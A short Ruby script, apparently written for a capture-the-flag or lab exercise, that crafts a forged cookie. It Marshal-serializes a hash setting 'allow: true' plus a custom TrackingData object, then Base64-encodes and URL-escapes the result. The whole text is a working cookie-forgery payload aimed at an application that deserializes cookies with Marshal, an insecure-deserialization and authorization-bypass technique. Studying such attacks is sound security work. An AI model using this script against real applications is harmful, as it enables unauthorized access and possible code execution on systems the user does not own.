require 'base64'
require 'cgi'

class TrackingData
end

payload = {
  allow: true,
  trackingInstance: TrackingData.new
}

cookie = CGI.escape(Base64.encode64(Marshal.dump(payload)))

puts cookie
